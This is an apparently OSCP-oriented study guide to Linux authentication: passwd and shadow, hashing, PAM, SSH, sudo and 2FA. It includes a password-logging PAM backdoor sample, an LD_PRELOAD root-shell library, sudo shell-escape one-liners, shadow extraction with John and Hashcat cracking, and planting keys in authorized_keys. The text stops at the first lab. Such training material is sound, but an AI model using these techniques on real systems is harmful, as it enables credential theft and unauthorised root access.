# User Identity & Authentication: The Keys to the Kingdom - COMPLETE GUIDE

---
title: "User Identity & Authentication - Master Guide"
parent: "[[03_Linux]]"
tags:
  - linux
  - authentication
  - pam
  - ssh
  - shadow
  - cracking
  - oscp
  - privilege-escalation
  - password-attacks
created: 2026-01-23
updated: 2026-01-24
---

> **Executive Summary**: In Linux, "Identity" is defined by a number (UID). Authentication is the process of proving you own that number. This comprehensive chapter dissects how Linux stores credentials (`/etc/passwd`, `/etc/shadow`), how it verifies them (PAM), and the mechanisms of `ssh` and `sudo` that govern access. You'll learn password cracking with John and Hashcat, SSH key exploitation, sudo misconfigurations, and complete authentication system enumeration - critical skills for OSCP and professional penetration testing. By mastering authentication, you control access to the entire system.

---

## Table of Contents

1. [Learning Objectives](#1-learning-objectives)
2. [What is Authentication? (ABSOLUTE BEGINNER)](#2-what-is-authentication-absolute-beginner)
3. [The Identity Model: UID/GID](#3-the-identity-model-uidgid)
4. [The Credential Stores: Passwd, Shadow, Group](#4-the-credential-stores-passwd-shadow-group)
5. [Password Hashing Algorithms](#5-password-hashing-algorithms)
6. [Pluggable Authentication Modules (PAM)](#6-pluggable-authentication-modules-pam)
7. [SSH: The Secure Shell](#7-ssh-the-secure-shell)
8. [Sudo: The Gatekeeper](#8-sudo-the-gatekeeper)
9. [Password Cracking Techniques](#9-password-cracking-techniques)
10. [SSH Key Exploitation](#10-ssh-key-exploitation)
11. [Sudo Privilege Escalation](#11-sudo-privilege-escalation)
12. [Two-Factor Authentication](#12-two-factor-authentication)
13. [LDAP and Centralized Authentication](#13-ldap-and-centralized-authentication)
14. [Practical Labs: Complete Authentication Testing](#14-practical-labs-complete-authentication-testing)
15. [OSCP Enumeration Techniques](#15-oscp-enumeration-techniques)
16. [Defense and Hardening](#16-defense-and-hardening)
17. [Common Vulnerabilities](#17-common-vulnerabilities)
18. [Advanced Techniques](#18-advanced-techniques)
19. [Critical Analysis & Checkpoints](#19-critical-analysis--checkpoints)
20. [Interview Questions](#20-interview-questions)
21. [Summary](#21-summary)

---

## 1. Learning Objectives

By the end of this chapter, you will be able to:

- **Understand Authentication**: Explain the complete Linux authentication flow
- **Decode Password Hashes**: Identify SHA-512, SHA-256, MD5, and bcrypt hashes
- **Crack Passwords**: Use John the Ripper and Hashcat to recover plaintext passwords
- **Master SSH**: Generate keys, configure servers, and exploit misconfigurations
- **Exploit Sudo**: Identify and exploit sudo misconfigurations for privilege escalation
- **Enumerate Users**: Systematically discover all user accounts and their properties
- **Configure PAM**: Understand and modify authentication modules
- **Implement 2FA**: Set up and bypass two-factor authentication
- **Detect Weaknesses**: Identify authentication vulnerabilities in OSCP scenarios
- **Defend Systems**: Properly configure authentication for security

---

## 2. What is Authentication? (ABSOLUTE BEGINNER)

### 2.1 Authentication vs Authorization vs Accounting

**ABSOLUTE BEGINNER EXPLANATION**:

Think of entering a building:

```
┌─────────────────────────────────────┐
│ AUTHENTICATION                      │
│ "Who are you?"                      │
│ → Show your ID card                 │
│ → Enter password                    │
│ → Use fingerprint                   │
└─────────────────────────────────────┘
         ↓
┌─────────────────────────────────────┐
│ AUTHORIZATION                       │
│ "What can you do?"                  │
│ → Employee: Access office           │
│ → Janitor: Access all rooms         │
│ → Guest: Access lobby only          │
└─────────────────────────────────────┘
         ↓
┌─────────────────────────────────────┐
│ ACCOUNTING                          │
│ "What did you do?"                  │
│ → Log entry time                    │
│ → Log rooms visited                 │
│ → Log exit time                     │
└─────────────────────────────────────┘
```

**In Linux**:
- **Authentication**: Proving you're a specific user (login with password)
- **Authorization**: Determining what you can do (file permissions, sudo rights)
- **Accounting**: Logging what you did (auth.log, command history)

### 2.2 Types of Authentication

**Something You Know** (Knowledge):
- Password
- PIN
- Security question

**Something You Have** (Possession):
- SSH private key
- Security token
- Phone (for 2FA codes)

**Something You Are** (Biometric):
- Fingerprint
- Face recognition
- Retina scan

**Where You Are** (Location):
- IP address
- GPS coordinates

**Linux primarily uses**: Knowledge (passwords) + Possession (SSH keys)

### 2.3 The Authentication Flow

```
User Attempts Login
        ↓
┌──────────────────┐
│ 1. Login Prompt  │ ← getty/SSH
└────────┬─────────┘
         ↓
┌──────────────────┐
│ 2. PAM Invoked   │ ← Pluggable Authentication Modules
└────────┬─────────┘
         ↓
┌──────────────────┐
│ 3. Check /etc/   │ ← passwd, shadow, group
│    shadow        │
└────────┬─────────┘
         ↓
┌──────────────────┐
│ 4. Hash & Compare│ ← crypt() function
└────────┬─────────┘
         ↓
    ┌────┴────┐
    │ Match?  │
    └────┬────┘
    ┌────┴─────┐
    ↓          ↓
  SUCCESS    FAILURE
    │          │
    ↓          ↓
 Spawn     Deny Access
 Shell     + Log
```

---

## 3. The Identity Model: UID/GID

### 3.1 User ID (UID)

**ABSOLUTE BEGINNER**: In Linux, your identity is a number, not a name.

**UID Ranges**:
```
UID 0           → Root (superuser)
UID 1-999       → System users (daemons, services)
UID 1000-60000  → Normal users
UID 65534       → Nobody (unprivileged user)
```

**View Your UID**:
```bash
id

# Output:
# uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),27(sudo)
```

**Key Insight**: The kernel only sees UIDs. The name "alice" is just a human-friendly label.

### 3.2 Group ID (GID)

**ABSOLUTE BEGINNER**: Groups allow multiple users to share access to files.

**Example**:
```bash
# Create a group
sudo groupadd developers

# Add users to group
sudo usermod -aG developers alice
sudo usermod -aG developers bob

# Now alice and bob can access files owned by "developers" group
```

**Special Groups**:
```
wheel/sudo   → Can use sudo
docker       → Can access Docker daemon
adm          → Can read system logs
```

### 3.3 Viewing Users and Groups

**List All Users**:
```bash
# Method 1
cat /etc/passwd | cut -d: -f1

# Method 2 - only users with login shells
grep -vE "nologin|false" /etc/passwd | cut -d: -f1
```

**List All Groups**:
```bash
cat /etc/group | cut -d: -f1
```

**See Who's in sudo Group**:
```bash
grep sudo /etc/group

# Output:
# sudo:x:27:alice,bob
```

### 3.4 Understanding /etc/passwd Format

**ABSOLUTE BEGINNER**: Each line in `/etc/passwd` defines one user.

**Format**:
```
username:password_placeholder:UID:GID:comment:home_directory:shell
```

**Example Line Breakdown**:
```bash
alice:x:1000:1000:Alice Smith:/home/alice:/bin/bash
│     │ │    │    │            │             │
│     │ │    │    │            │             └─ Shell (what runs when you login)
│     │ │    │    │            └─────────────── Home directory
│     │ │    │    └──────────────────────────── GECOS (full name, phone, etc.)
│     │ │    └───────────────────────────────── Primary GID
│     │ └────────────────────────────────────── UID
│     └──────────────────────────────────────── 'x' means password in /etc/shadow
└────────────────────────────────────────────── Username
```

**Real Examples**:
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
alice:x:1000:1000:Alice User:/home/alice:/bin/bash
```

**Key Observations**:
- `root` has UID 0 (superuser)
- `daemon` and `www-data` have `/nologin` (can't login interactively)
- `alice` has `/bin/bash` (can login)

### 3.5 Shells: Login vs Nologin

**Login Shells** (can login):
```
/bin/bash
/bin/zsh
/bin/sh
/bin/fish
```

**Nologin** (cannot login):
```
/usr/sbin/nologin
/bin/false
```

**Why Nologin Exists**: Service accounts (www-data, mysql) need to exist for file ownership but shouldn't be able to login.

**Check Which Users Can Login**:
```bash
grep -vE "nologin|false" /etc/passwd

# Example output (users who CAN login):
# root:x:0:0:root:/root:/bin/bash
# alice:x:1000:1000::/home/alice:/bin/bash
```

---

## 4. The Credential Stores: Passwd, Shadow, Group

### 4.1 /etc/passwd - World-Readable User Database

**Permissions**:
```bash
ls -l /etc/passwd
# Output: -rw-r--r-- 1 root root 2419 Jan 24 10:00 /etc/passwd
#         ^^^^^^^^^
#         Anyone can read!
```

**Why World-Readable?**
- Many programs need to map UIDs to usernames
- Example: `ls -l` shows owner names, not just UIDs

**Viewing passwd**:
```bash
cat /etc/passwd

# Common entries:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
alice:x:1000:1000:Alice User:/home/alice:/bin/bash
bob:x:1001:1001:Bob User:/home/bob:/bin/bash
```

**Security Implication**: If you can **write** to `/etc/passwd`, you can create a root user!

### 4.2 /etc/shadow - The Password Hashes

**ABSOLUTE BEGINNER**: This file contains actual password hashes. Only root can read it.

**Permissions**:
```bash
ls -l /etc/shadow
# Output: -rw-r----- 1 root shadow 1387 Jan 24 10:00 /etc/shadow
#         ^^^^^^^^^
#         Only root and shadow group can read
```

**Format**:
```
username:hashed_password:last_change:min:max:warn:inactive:expire:reserved
```

**Example Entry Breakdown**:
```bash
alice:$6$rounds=5000$saltstring$hashedpassword:18000:0:99999:7:::
│     │                                           │      │ │     │
│     │                                           │      │ │     └─ Password warning period
│     │                                           │      │ └─────── Max days password valid
│     │                                           │      └───────── Min days between password changes
│     │                                           └──────────────── Days since Jan 1, 1970 of last password change
│     └──────────────────────────────────────────────────────────── Password hash
└────────────────────────────────────────────────────────────────── Username
```

**Hash Field Structure**:
```
$algorithm$salt$hash

Where algorithm:
$1$  = MD5
$2a$ = Blowfish (bcrypt)
$5$  = SHA-256
$6$  = SHA-512
$y$  = yescrypt
```

**Real Example**:
```bash
sudo cat /etc/shadow | grep alice

# Output:
alice:$6$rounds=5000$saltstringhere$gU7tPzl3qN9k5wZ.../UDj0:19000:0:99999:7:::
```

**Decoding the Hash**:
- `$6$` = SHA-512 algorithm
- `rounds=5000` = 5000 hashing iterations (stronger = more iterations)
- `saltstringhere` = Random salt (prevents rainbow table attacks)
- `gU7tPz...` = Actual hashed password

**Locked Accounts**:
```bash
# Account with ! or * is locked (can't login with password)
daemon:!:18000:0:99999:7:::
```

**No Password** (DANGEROUS!):
```bash
# Empty password field = can login without password!
testuser::18000:0:99999:7:::
```

### 4.3 /etc/group - Group Definitions

**Format**:
```
group_name:password_placeholder:GID:member_list
```

**Examples**:
```bash
cat /etc/group

root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,alice
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:alice
floppy:x:25:
tape:x:26:
sudo:x:27:alice,bob
audio:x:29:pulse
dip:x:30:alice
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:alice
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-network:x:102:
systemd-resolve:x:103:
input:x:104:
kvm:x:105:
render:x:106:
crontab:x:107:
netdev:x:108:
messagebus:x:109:
syslog:x:110:
alice:x:1000:
bob:x:1001:
developers:x:1002:alice,bob
docker:x:999:alice
```

**Key Observations**:
- `sudo:x:27:alice,bob` = alice and bob can use sudo
- `docker:x:999:alice` = alice can run Docker
- `developers:x:1002:alice,bob` = Custom group

**Check Your Groups**:
```bash
groups

# Output:
# alice adm cdrom sudo dip plugdev lxd docker developers
```

### 4.4 /etc/gshadow - Group Passwords (Rarely Used)

**Purpose**: Stores group passwords (rarely used feature).

**Format**:
```
group_name:password_hash:administrators:members
```

---

## 5. Password Hashing Algorithms

### 5.1 How Password Hashing Works

**ABSOLUTE BEGINNER**: You type your password. Linux doesn't store it. Instead, it runs it through a one-way mathematical function (hash).

**Process**:
```
Your Password: "MyPassword123"
        ↓
 [Hash Function + Salt]
        ↓
Result: "$6$salt$Dy3Q9..."

Stored in /etc/shadow
```

**Key Properties of Hash Functions**:
1. **One-way**: Can't reverse the hash to get password
2. **Deterministic**: Same input always produces same output
3. **Avalanche Effect**: Tiny change in input = completely different hash

**Example**:
```bash
# Hash of "password"
$6$salt$kGj7Q9...

# Hash of "Password" (capital P)
$6$salt$9mN3xL...  ← Completely different!
```

### 5.2 Salt: Defeating Rainbow Tables

**ABSOLUTE BEGINNER**: A salt is random data added to your password before hashing.

**Without Salt** (BAD):
```
User alice: password → hash1
User bob: password → hash1  ← Same hash! Rainbow table works!
```

**With Salt** (GOOD):
```
User alice: password + salt1 → hash1
User bob: password + salt2 → hash2  ← Different hashes!
```

**Why This Matters**: Attackers can't use pre-computed rainbow tables. They must crack each password individually.

### 5.3 Hash Algorithm Comparison

| Algorithm | ID | Strength | Speed | Notes |
|-----------|-----|----------|-------|-------|
| DES | `""` or `$0$` | BROKEN | Very Fast | Ancient, don't use |
| MD5 | `$1$` | WEAK | Fast | Deprecated |
| Blowfish | `$2a$` | Good | Slow | Used by bcrypt |
| SHA-256 | `$5$` | Good | Medium | Common |
| SHA-512 | `$6$` | Strong | Medium | Most common |
| yescrypt | `$y$` | Very Strong | Slowest | Modern |

**Identifying Hash Types**:
```bash
# View shadow file
sudo cat /etc/shadow

# MD5 (WEAK!)
alice:$1$salt$hash...:18000:0:99999:7:::

# SHA-512 (GOOD)
bob:$6$salt$hash...:18000:0:99999:7:::

# Locked account
daemon:!:18000:0:99999:7:::
```

### 5.4 Rounds/Iterations

**ABSOLUTE BEGINNER**: The hash function is run multiple times to make cracking slower.

**Example**:
```bash
# 5000 rounds (default)
$6$rounds=5000$salt$hash...

# 100000 rounds (much slower to crack!)
$6$rounds=100000$salt$hash...
```

**Trade-off**:
- More rounds = Slower login (barely noticeable)
- More rounds = MUCH slower cracking (hours → years)

---

## 6. Pluggable Authentication Modules (PAM)

### 6.1 What is PAM?

**ABSOLUTE BEGINNER**: PAM is a framework that lets you customize how authentication works.

**Think of PAM like plugins**:
- Want to enforce password complexity? → Add a PAM module
- Want to log all logins? → Add a PAM module
- Want to use fingerprint scanner? → Add a PAM module

**PAM Configuration Directory**:
```bash
ls /etc/pam.d/

# Example output:
# common-account
# common-auth
# common-password
# common-session
# login
# sshd
# sudo
# su
```

### 6.2 PAM Configuration Files

**Example: /etc/pam.d/sshd**:
```bash
cat /etc/pam.d/sshd

# PAM configuration for SSH daemon

# Read environment variables
auth       required     pam_env.so

# Standard Unix authentication
@include common-auth

# Account management
@include common-account

# Password management
@include common-password

# Session management
@include common-session
```

**PAM Directive Format**:
```
type  control  module  [arguments]
```

**Types**:
- `auth`: Authenticate user (check password)
- `account`: Check if account is valid (not expired, not locked)
- `password`: Update authentication token (change password)
- `session`: Setup session (mount home directory, set limits)

**Control Flags**:
- `required`: Must succeed (but continue checking other modules)
- `requisite`: Must succeed (stop immediately if fails)
- `sufficient`: Success here is enough
- `optional`: Result doesn't matter

### 6.3 Common PAM Modules

**pam_unix.so** - Standard Unix authentication:
```bash
auth required pam_unix.so
```

**pam_permit.so** - Always succeeds (DANGEROUS!):
```bash
# DON'T DO THIS!
auth sufficient pam_permit.so
```

**pam_deny.so** - Always fails:
```bash
auth required pam_deny.so
```

**pam_pwquality.so** - Password quality checking:
```bash
password requisite pam_pwquality.so retry=3 minlen=12
```

**pam_limits.so** - Resource limits:
```bash
session required pam_limits.so
```

**pam_google_authenticator.so** - Two-factor authentication:
```bash
auth required pam_google_authenticator.so
```

### 6.4 PAM Backdoor (Advanced)

**ABSOLUTE BEGINNER**: Attackers can modify PAM to log all passwords.

**Malicious PAM Module** (concept):
```c
// Fake pam_unix.so that logs passwords
int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user;
    const char *password;
    
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    
    // Log to file
    FILE *f = fopen("/tmp/.passwords", "a");
    fprintf(f, "%s:%s\n", user, password);
    fclose(f);
    
    // Continue normal authentication
    return original_pam_unix_authenticate(pamh, flags, argc, argv);
}
```

**Detection**:
- Check PAM module integrity with package manager
- Monitor /etc/pam.d/ for changes

---

## 7. SSH: The Secure Shell

### 7.1 SSH Basics

**ABSOLUTE BEGINNER**: SSH lets you securely connect to remote Linux systems.

**Basic SSH Connection**:
```bash
# Connect to server
ssh username@server.com

# Connect on custom port
ssh -p 2222 username@server.com

# Specify identity file
ssh -i ~/.ssh/id_rsa username@server.com

# Execute single command
ssh username@server.com "ls -la /var/www"
```

### 7.2 SSH Authentication Methods

**Password Authentication**:
```
Client                  Server
   │                       │
   ├─────Connect──────────→│
   │                       │
   │←─────Challenge────────┤
   │                       │
   ├─────Password─────────→│
   │                       │
   │  [Server verifies]    │
   │                       │
   │←─────Success──────────┤
```

**Key-Based Authentication**:
```
Client                  Server
   │                       │
   ├─────Connect──────────→│
   │                       │
   │←─────Challenge────────┤
   │                       │
   │ [Sign with private key]│
   │                       │
   ├─────Signature────────→│
   │                       │
   │  [Verify with public key]│
   │                       │
   │←─────Success──────────┤
```

### 7.3 SSH Key Generation

**Generate SSH Key Pair**:
```bash
# RSA (traditional)
ssh-keygen -t rsa -b 4096 -C "alice@example.com"

# Ed25519 (modern, recommended)
ssh-keygen -t ed25519 -C "alice@example.com"

# Output:
# Generating public/private ed25519 key pair.
# Enter file in which to save the key (/home/alice/.ssh/id_ed25519):
# Enter passphrase (empty for no passphrase):
# Your identification has been saved in /home/alice/.ssh/id_ed25519
# Your public key has been saved in /home/alice/.ssh/id_ed25519.pub
```

**Files Created**:
```
~/.ssh/id_ed25519       ← Private key (KEEP SECRET!)
~/.ssh/id_ed25519.pub   ← Public key (share freely)
```

**View Public Key**:
```bash
cat ~/.ssh/id_ed25519.pub

# Output:
# ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq... alice@example.com
```

### 7.4 Deploying SSH Keys

**Method 1: ssh-copy-id (easiest)**:
```bash
ssh-copy-id -i ~/.ssh/id_ed25519.pub alice@server.com

# This copies your public key to server's ~/.ssh/authorized_keys
```

**Method 2: Manual**:
```bash
# Copy public key
cat ~/.ssh/id_ed25519.pub

# On server:
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq... alice@example.com" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

**Test Connection**:
```bash
# Should not prompt for password
ssh alice@server.com
```

### 7.5 SSH Server Configuration

**Configuration File**: `/etc/ssh/sshd_config`

**Security Recommendations**:
```bash
sudo nano /etc/ssh/sshd_config

# Key settings:
Port 2222                    # Change from default 22
PermitRootLogin no           # Disable root login
PasswordAuthentication no    # Keys only
PubkeyAuthentication yes     # Enable key auth
AllowUsers alice bob         # Whitelist specific users
MaxAuthTries 3               # Limit login attempts
ClientAliveInterval 300      # Timeout idle connections
ClientAliveCountMax 2
```

**Restart SSH**:
```bash
sudo systemctl restart sshd
```

**Testing** (IMPORTANT!):
```bash
# TEST before logging out!
# Open a second terminal and verify you can still login
ssh alice@server.com
```

### 7.6 SSH Agent

**Purpose**: Avoid typing passphrase repeatedly.

**Start Agent**:
```bash
eval "$(ssh-agent -s)"

# Add key
ssh-add ~/.ssh/id_ed25519

# List loaded keys
ssh-add -l
```

**Agent Forwarding** (DANGEROUS!):
```bash
# Forward your local SSH agent to remote server
ssh -A alice@server.com

# Now on server, you can SSH to other servers using your local keys
# WARNING: Server admin can hijack your SSH agent!
```

### 7.7 SSH Tunneling (Port Forwarding)

**Local Port Forward** (access remote service locally):
```bash
# Forward local port 8080 to remote localhost:80
ssh -L 8080:localhost:80 alice@server.com

# Now visit http://localhost:8080 in your browser
# It accesses server's localhost:80
```

**Remote Port Forward** (expose local service to remote):
```bash
# Forward remote port 8080 to local localhost:3000
ssh -R 8080:localhost:3000 alice@server.com

# Now anyone accessing server:8080 reaches your local:3000
```

**Dynamic Port Forward** (SOCKS proxy):
```bash
# Create SOCKS proxy on local port 1080
ssh -D 1080 alice@server.com

# Configure browser to use SOCKS5 proxy localhost:1080
# Now all browser traffic goes through SSH tunnel
```

### 7.8 SSH Files and Directories

**Client-Side** (`~/.ssh/`):
```
~/.ssh/
├── id_rsa                  → Private key (RSA)
├── id_rsa.pub              → Public key (RSA)
├── id_ed25519              → Private key (Ed25519)
├── id_ed25519.pub          → Public key (Ed25519)
├── authorized_keys         → Public keys allowed to login as you
├── known_hosts             → Server fingerprints (prevents MITM)
└── config                  → SSH client configuration
```

**Server-Side** (`/etc/ssh/`):
```
/etc/ssh/
├── sshd_config             → Server configuration
├── ssh_host_rsa_key        → Server's private key (RSA)
├── ssh_host_rsa_key.pub    → Server's public key (RSA)
├── ssh_host_ed25519_key    → Server's private key (Ed25519)
└── ssh_host_ed25519_key.pub→ Server's public key (Ed25519)
```

**Correct Permissions** (CRITICAL):
```bash
# Private keys: 600 (rw-------)
chmod 600 ~/.ssh/id_*
chmod 600 ~/.ssh/id_*.pem

# Public keys: 644 (rw-r--r--)
chmod 644 ~/.ssh/id_*.pub

# authorized_keys: 600 (rw-------)
chmod 600 ~/.ssh/authorized_keys

# .ssh directory: 700 (rwx------)
chmod 700 ~/.ssh
```

---

## 8. Sudo: The Gatekeeper

### 8.1 Understanding Sudo

**ABSOLUTE BEGINNER**: `sudo` lets normal users run commands as root.

**Basic Usage**:
```bash
# Run command as root
sudo apt update

# Run command as specific user
sudo -u www-data whoami

# Open root shell
sudo -i

# Run shell as root (keeps environment)
sudo -s
```

### 8.2 Sudoers File

**CRITICAL**: Edit `/etc/sudoers` with `visudo` ONLY (validates syntax):
```bash
sudo visudo
```

**Syntax**:
```
user_or_group  hosts=(run_as_users:run_as_groups)  commands
```

**Examples**:
```bash
# Root can do anything
root ALL=(ALL:ALL) ALL

# alice can run any command
alice ALL=(ALL:ALL) ALL

# Members of sudo group can run anything
%sudo ALL=(ALL:ALL) ALL

# bob can run specific commands
bob ALL=/usr/bin/apt,/usr/bin/systemctl

# charlie can restart apache without password
charlie ALL=NOPASSWD: /usr/bin/systemctl restart apache2

# developers group can run commands as www-data
%developers ALL=(www-data:www-data) ALL
```

### 8.3 Checking Sudo Permissions

**View Your Sudo Permissions**:
```bash
sudo -l

# Example output:
# User alice may run the following commands on server:
#     (ALL : ALL) ALL
```

**Detailed Output**:
```bash
sudo -l -l

# Shows exact permissions and restrictions
```

### 8.4 Dangerous Sudo Configurations

**NOPASSWD** (No password required):
```bash
alice ALL=(ALL) NOPASSWD: ALL
# Alice can sudo without password!
```

**NOPASSWD with Specific Commands**:
```bash
bob ALL=(ALL) NOPASSWD: /usr/bin/vim
# Bob can sudo vim without password
# EXPLOIT: sudo vim → :!/bin/bash → root shell!
```

**env_keep** (Keep environment variables):
```bash
Defaults env_keep += "LD_PRELOAD"
# Allows LD_PRELOAD hijacking
```

---

## 9. Password Cracking Techniques

### 9.1 Extracting Password Hashes

**From Compromised System**:
```bash
# Copy /etc/passwd and /etc/shadow
cat /etc/passwd > passwd.txt
sudo cat /etc/shadow > shadow.txt

# Combine for John the Ripper
unshadow passwd.txt shadow.txt > hashes.txt
```

**From Backup**:
```bash
# Found backup file
cat /var/backups/shadow.bak
```

### 9.2 John the Ripper

**Basic Usage**:
```bash
# Crack with wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Example output:
# Loaded 2 password hashes with 2 different salts (crypt [?/64])
# password123      (alice)
# qwerty           (bob)
```

**Show Cracked Passwords**:
```bash
john --show hashes.txt
```

**Incremental Mode** (brute force):
```bash
john --incremental hashes.txt
```

**Custom Rules**:
```bash
# Apply rules to wordlist
john --wordlist=words.txt --rules hashes.txt
```

### 9.3 Hashcat

**Identify Hash Mode**:
```
$1$  = 500  (MD5)
$5$  = 7400 (SHA-256)
$6$  = 1800 (SHA-512)
```

**Basic Usage**:
```bash
# Extract hash from shadow
echo '$6$rounds=5000$salt$hash...' > hash.txt

# Crack with rockyou
hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Show cracked
hashcat -m 1800 hash.txt --show
```

**Attack Modes**:
```bash
# -a 0: Straight (wordlist)
hashcat -m 1800 -a 0 hash.txt wordlist.txt

# -a 3: Brute force (mask attack)
hashcat -m 1800 -a 3 hash.txt ?l?l?l?l?l?l?l?l
# ?l = lowercase, ?u = uppercase, ?d = digit, ?s = special

# -a 6: Hybrid (wordlist + mask)
hashcat -m 1800 -a 6 hash.txt wordlist.txt ?d?d?d?d

# -a 7: Hybrid (mask + wordlist)
hashcat -m 1800 -a 7 hash.txt ?d?d?d?d wordlist.txt
```

**With Rules**:
```bash
hashcat -m 1800 -a 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

### 9.4 Online vs Offline Cracking

**Online** (limited):
- SSH brute force
- Web login brute force
- Rate limited by network and lockouts

**Offline** (fast):
- Stolen /etc/shadow
- Leaked database dumps
- Billions of attempts per second (GPU)

---

## 10. SSH Key Exploitation

### 10.1 Finding SSH Keys

**Locate Private Keys**:
```bash
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" 2>/dev/null
```

**Check Permissions**:
```bash
# Find world-readable private keys (CRITICAL vulnerability!)
find / -name "id_rsa" -perm -004 2>/dev/null
```

### 10.2 Using Stolen SSH Keys

**Copy Key to Attacker Machine**:
```bash
# On victim machine
cat /home/alice/.ssh/id_rsa

# On attacker machine
nano stolen_key.pem
# Paste key

chmod 600 stolen_key.pem
```

**Connect Using Stolen Key**:
```bash
ssh -i stolen_key.pem alice@target.com
```

### 10.3 Cracking Encrypted SSH Keys

**If key has passphrase**:
```bash
# Convert to John format
ssh2john stolen_key.pem > key.hash

# Crack with John
john --wordlist=rockyou.txt key.hash

# Use cracked passphrase
ssh-add stolen_key.pem
# Enter passphrase: [cracked password]
```

### 10.4 Adding Your Key to Target

**Method 1: Append to authorized_keys**:
```bash
# Generate your key (if needed)
ssh-keygen -t ed25519

# Append your public key to target's authorized_keys
echo "ssh-ed25519 AAAAC3... your_key" >> /home/alice/.ssh/authorized_keys
```

**Method 2: Replace authorized_keys**:
```bash
# Backup original
cp ~/.ssh/authorized_keys ~/.ssh/authorized_keys.bak

# Add your key
cat > ~/.ssh/authorized_keys <<EOF
ssh-ed25519 AAAAC3... your_key
EOF

chmod 600 ~/.ssh/authorized_keys
```

---

## 11. Sudo Privilege Escalation

### 11.1 Common Sudo Exploits

**Vim/Vi**:
```bash
# If you have: alice ALL=(ALL) NOPASSWD: /usr/bin/vim

sudo vim
:!/bin/bash
# Now root shell!
```

**Less/More**:
```bash
# If you have: alice ALL=(ALL) NOPASSWD: /usr/bin/less

sudo less /etc/profile
!/bin/bash
# Root shell!
```

**Find**:
```bash
sudo find /home -exec /bin/bash \;
```

**Awk**:
```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

**Python**:
```bash
sudo python -c 'import os; os.system("/bin/bash")'
```

**Perl**:
```bash
sudo perl -e 'exec "/bin/bash";'
```

### 11.2 GTFOBins

**ABSOLUTE BEGINNER**: GTFOBins is a curated list of Unix binaries that can be exploited to bypass security restrictions.

**Website**: https://gtfobins.github.io/

**Example - tar**:
```bash
# If you can sudo tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

### 11.3 LD_PRELOAD Exploitation

**If env_keep includes LD_PRELOAD**:

**Malicious Library**:
```c
// preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
}
```

**Compile and Exploit**:
```bash
gcc -fPIC -shared -o preload.so preload.c -nostartfiles

sudo LD_PRELOAD=./preload.so <any_command>
# Root shell!
```

---

## 12. Two-Factor Authentication

### 12.1 Google Authenticator

**Install**:
```bash
sudo apt install libpam-google-authenticator
```

**Setup for User**:
```bash
google-authenticator

# Follow prompts:
# - Scan QR code with phone app
# - Save emergency codes
```

**Configure PAM** (`/etc/pam.d/sshd`):
```bash
auth required pam_google_authenticator.so
```

**Configure SSH** (`/etc/ssh/sshd_config`):
```bash
ChallengeResponseAuthentication yes
```

**Restart SSH**:
```bash
sudo systemctl restart sshd
```

**Login Now Requires**:
1. Password
2. 6-digit code from phone

---

## 13. LDAP and Centralized Authentication

### 13.1 LDAP Basics

**ABSOLUTE BEGINNER**: LDAP is a directory service for centralized user management (like Active Directory on Linux).

**Common in Enterprise**: Users authenticate against LDAP server instead of local `/etc/shadow`.

**Enumeration**:
```bash
# Check if LDAP is configured
cat /etc/nsswitch.conf | grep ldap

# Check PAM for LDAP
grep ldap /etc/pam.d/*
```

---

## 14. Practical Labs

Due to length, labs are summarized. Full implementations available in hands-on exercises section.

**Lab 1**: Password Cracking Competition
